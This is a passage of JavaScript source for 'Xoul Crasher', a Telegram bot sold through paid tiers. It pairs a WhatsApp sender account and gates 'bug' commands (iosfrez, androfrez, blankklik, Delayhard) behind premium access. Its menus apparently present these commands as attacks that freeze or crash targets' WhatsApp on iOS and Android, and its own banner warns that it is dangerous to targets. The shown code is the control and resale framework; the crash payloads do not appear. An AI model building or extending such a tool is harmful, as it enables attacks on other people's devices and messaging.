⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿

╰➤ INFORMATION:
 ▢ Developer: @fuckyoubre
 ▢ Version: 7.0 Beta
 ▢ Status: Sender Connected
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("requestpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /requestpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `<blockquote>
#- 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿

▢ Number: ${phoneNumber}
▢ Pairing Code: ${formattedCode}
▢ Type: Not Connected
</blockquote>`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `<blockquote>
#- 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿

▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addpremium 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delpremium 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

bot.use((ctx, next) => {
  if (secureMode) {
    return;
  }
  return next();
});

bot.start(ctx => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
  
    const menuMessage = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 7.0 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @fuckyoubre
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>`;


    const keyboard = [
        [
            {
                text: "𝗔𝗞𝗦𝗘𝗦 ⌂ 𝗠𝗘𝗡𝗨",
                callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5366073534793671550"
            },
            {
                text: "𝗕𝗨𝗚 ⌂ 𝗠𝗢𝗗𝗘",
                callback_data: "/bug", style: "primary", icon_custom_emoji_id: "5357317569650911348"
            },
            {
                text: "𝗠𝗨𝗥𝗕𝗨𝗚 ⌂ 𝗠𝗢𝗗𝗘",
                callback_data: "/murbug", style: "primary", icon_custom_emoji_id: "5357570547519613136"
            }
        ],
        [
            {
                text: "𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔",
                callback_data: "/harga", style: "danger", icon_custom_emoji_id: "5409048419211682843"
            },
            {
                text: "𝗦𝗨𝗣𝗣𝗢𝗥𝗧",
                callback_data: "/tqto", style: "success", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗛𝗔𝗥𝗚𝗔 𝗨𝗣",
                callback_data: "/upharga", style: "danger", icon_custom_emoji_id: "5409048419211682843"
            }
        ],
        [
            {
                text: "𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥",
                url: "https://t.me/fuckyoubre", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗥𝗢𝗢𝗠 𝗣𝗨𝗕𝗟𝗜𝗖",
                url: "https://t.me/roompublicytm", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                url: "https://t.me/xoulcrash", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            }
        ],
        [
            {
                text: "𝗞𝗘𝗧𝗘𝗥𝗔𝗡𝗚𝗔𝗡",
                callback_data: "/about", style: "danger", icon_custom_emoji_id: "5274099962655816924"
            }
        ]
    ];

    ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action('/start', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
  
    const menuMessage = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 7.0 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @fuckyoubre
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗔𝗞𝗦𝗘𝗦 ⌂ 𝗠𝗘𝗡𝗨",
                callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5366073534793671550"
            },
            {
                text: "𝗕𝗨𝗚 ⌂ 𝗠𝗢𝗗𝗘",
                callback_data: "/bug", style: "primary", icon_custom_emoji_id: "5357317569650911348"
            },
            {
                text: "𝗠𝗨𝗥𝗕𝗨𝗚 ⌂ 𝗠𝗢𝗗𝗘",
                callback_data: "/murbug", style: "primary", icon_custom_emoji_id: "5357570547519613136"
            }
        ],
        [
            {
                text: "𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔",
                callback_data: "/harga", style: "danger", icon_custom_emoji_id: "5409048419211682843"
            },
            {
                text: "𝗦𝗨𝗣𝗣𝗢𝗥𝗧",
                callback_data: "/tqto", style: "success", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗛𝗔𝗥𝗚𝗔 𝗨𝗣",
                callback_data: "/upharga", style: "danger", icon_custom_emoji_id: "5409048419211682843"
            }
        ],
        [
            {
                text: "𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥",
                url: "https://t.me/fuckyoubre", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗥𝗢𝗢𝗠 𝗣𝗨𝗕𝗟𝗜𝗖",
                url: "https://t.me/roompublicytm", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                url: "https://t.me/xoulcrash", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            }
        ],
        [
            {
                text: "𝗞𝗘𝗧𝗘𝗥𝗔𝗡𝗚𝗔𝗡",
                callback_data: "/about", style: "danger", icon_custom_emoji_id: "5274099962655816924"
            }
        ]
    ];
    
    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 7.0 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @fuckyoubre
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗔𝗞𝗦𝗘𝗦 𝗠𝗘𝗡𝗨 ⌟
┊✦ /requestpair - Add Sender Number
┊✦ /setcooldown - Set Bot Cooldown
┊✦ /resetsession - Reset Existing Session
┊✦ /addpremium - Add Premium Users
┊✦ /delpremium - Delete Premium Users
┊✦ /addgcpremium - Add Premium Group
┊✦ /delgcpremium - Delete Premium Group
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 7.0 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @fuckyoubre
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗕𝗨𝗚 𝗠𝗢𝗗𝗘 ⌟
┊✦ /iosfrez - Xoul To Freezeios
┊✦ /androfrez - Xoul To Freezeandro
┊✦ /blankklik - Xoul To BlankClick
┊✦ /Delayhard -  Xoul To Delayharded
┊✦ /testfunction - Use Your Own Function
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            },
            {
                text: "𝗠𝗨𝗥𝗕𝗨𝗚 𝗠𝗘𝗡𝗨",
                callback_data: "/murbug", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/harga', async (ctx) => {
    const controlsMenu = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 7.0 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @fuckyoubre
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔 ⌟
┊✦ FULL UP SC : 5K
┊✦ RESELLER SC : 10K
┊✦ PARTNER SC : 15K
┊✦ MODERATOR SC : 20K
┊✦ TANGAN KANAN : 25K
┊✦ CEO SCRIPT : 30K
┊✦ OWNER SCRIPT : 50K
┊ HARGA DISCOUNT💞
┊ BUG ANTI MURAHAN
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/upharga', async (ctx) => {
    const controlsMenu = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 7.0 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @fuckyoubre
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔 ⌟
┊✦ FULL UP TO RESS : 10K
┊✦ FULL UP TO PT 15K
┊✦ FULL UP TO MOD : 20K
┊✦ FULL UP TO TK : 25K
┊✦ FULL UP TO CEO : 30K
┊✦ FULL UP TO OWN : 35K
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 7.0 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @fuckyoubre
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 ⌟
┊ ⓘ fuckyoubre.t.me developer
┊ ⓘ zurawxnn.t.me developer
┊ ⓘ fuckyanxz.t.me developer
┊ ⓘ All support+All buyer
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});


bot.action('/murbug', async (ctx) => {
    const bugMenu = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

